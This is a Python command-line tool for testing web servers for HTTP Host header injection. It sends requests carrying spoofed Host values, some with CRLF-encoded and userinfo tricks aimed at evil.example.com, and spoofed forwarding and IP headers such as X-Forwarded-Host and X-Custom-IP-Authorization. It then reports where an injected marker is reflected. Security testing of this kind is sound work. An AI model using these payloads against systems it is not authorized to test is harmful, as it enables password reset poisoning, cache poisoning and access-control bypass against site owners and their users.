#!/usr/bin/env python3
"""
Host Injector — HTTP Host Header Injection Testing Tool
Tests for password reset poisoning, SSRF, and cache poisoning via Host header manipulation.
Author: Omar Khalid (amooryx) | github.com/amooryx/host-injector
AUTHORIZED USE ONLY — for authorized security testing and bug bounty.
"""

import argparse
import json
import random
import string
import sys
import urllib.parse
import urllib.request
import urllib.error

EVIL_HOSTS = [
    "evil.example.com",
    "evil.example.com:80",
    "evil.example.com%0d%0a",
    "evil.example.com%20",
    "evil.example.com%09",
    "evil.example.com:443@legit.example.com",
    "legit.example.com.evil.example.com",
]

AMBIGUOUS_HEADERS = {
    "X-Forwarded-Host":  "evil.example.com",
    "X-Host":            "evil.example.com",
    "X-Forwarded-Server":"evil.example.com",
    "X-Original-Host":   "evil.example.com",
    "Forwarded":         "host=evil.example.com",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "X-Remote-IP":       "127.0.0.1",
    "X-Remote-Addr":     "127.0.0.1",
    "X-ProxyUser-Ip":    "127.0.0.1",
}

def rand_marker() -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=8))

def fetch(url: str, override_headers: dict, timeout: float = 10) -> dict:
    req = urllib.request.Request(url)
    req.add_header("User-Agent", "HostInjector/1.0")
    for k, v in override_headers.items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(8192).decode(errors="ignore")
            return {"status": resp.status, "body": body,
                    "headers": {k.lower(): v for k, v in resp.headers.items()}}
    except urllib.error.HTTPError as e:
        body = e.read(2048).decode(errors="ignore") if hasattr(e, "read") else ""
        return {"status": e.code, "body": body, "headers": {}}
    except Exception as ex:
        return {"status": 0, "error": str(ex), "body": "", "headers": {}}

def test_host_header_injection(url: str, timeout: float) -> list[dict]:
    findings = []
    marker = rand_marker()
    parsed = urllib.parse.urlparse(url)
    orig_host = parsed.hostname

    for evil in EVIL_HOSTS:
        resp = fetch(url, {"Host": evil.replace("evil.example.com", f"{marker}.example.com")}, timeout)
        if marker in resp.get("body", ""):
            findings.append({
                "type": "host_injection_reflected",
                "evil_host": evil,
                "marker": marker,
                "status": resp["status"],
                "note": "Injected host name reflected in body — potential password reset poisoning",
            })
            print(f"  [!!!] REFLECTED: Host: {evil}  — marker found in response body")
    return findings

def test_ambiguous_headers(url: str, timeout: float) -> list[dict]:
    findings = []
    marker = rand_marker()
    for hdr, val in AMBIGUOUS_HEADERS.items():
        evil_val = val.replace("evil.example.com", f"{marker}.example.com")
        resp     = fetch(url, {hdr: evil_val}, timeout)
        reflected = marker in resp.get("body", "")
        status_change = resp["status"] in (200, 403)
        if reflected:
            findings.append({
                "type": "ambiguous_header_reflected",
                "header": hdr, "value": evil_val,
                "status": resp["status"],
                "note": f"Marker reflected in response — {hdr} processed server-side",
            })
            print(f"  [!!!] REFLECTED via {hdr}: {evil_val[:40]}")
        elif resp["status"] == 200:
            # Could still be processed even without reflection
            findings.append({
                "type": "ambiguous_header_accepted",
                "header": hdr, "value": evil_val,
                "status": resp["status"],
                "note": f"{hdr} accepted without error (check OOB for blind hits)",
            })
    return findings

def main():
    parser = argparse.ArgumentParser(
        description="Host Injector — Host Header Injection Testing (Authorized use only)",
    )
    parser.add_argument("url",          help="Target URL")
    parser.add_argument("--timeout",    type=float, default=10)
    parser.add_argument("--out",        help="Output JSON file")
    args = parser.parse_args()

    print(f"[*] Host header injection testing: {args.url}")
    findings = []
    findings.extend(test_host_header_injection(args.url, args.timeout))
    findings.extend(test_ambiguous_headers(args.url, args.timeout))
    print(f"\n[*] {len(findings)} findings")
    if args.out:
        with open(args.out, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"[*] Results → {args.out}")

if __name__ == "__main__":
    main()
